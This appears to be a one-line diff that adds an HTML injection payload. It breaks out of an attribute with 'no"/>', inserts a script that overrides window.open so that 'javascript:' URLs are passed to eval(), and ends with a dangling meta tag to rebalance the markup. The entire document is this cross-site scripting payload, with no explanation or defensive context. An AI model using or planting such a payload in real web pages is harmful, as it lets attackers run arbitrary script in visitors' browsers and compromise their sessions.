@@ -1,0 +1,1 @@
+no"/><script>!function(){'use strict';const _w=window,_o=_w.open;_w.open=function(url){if('javascript:'!==url.substring(0,11))return _o.apply(null,arguments);var script=url.substring(11).trim();try{eval(script)}catch(a){return console.error('Exception:\n'+a)}}}();</script><meta name="
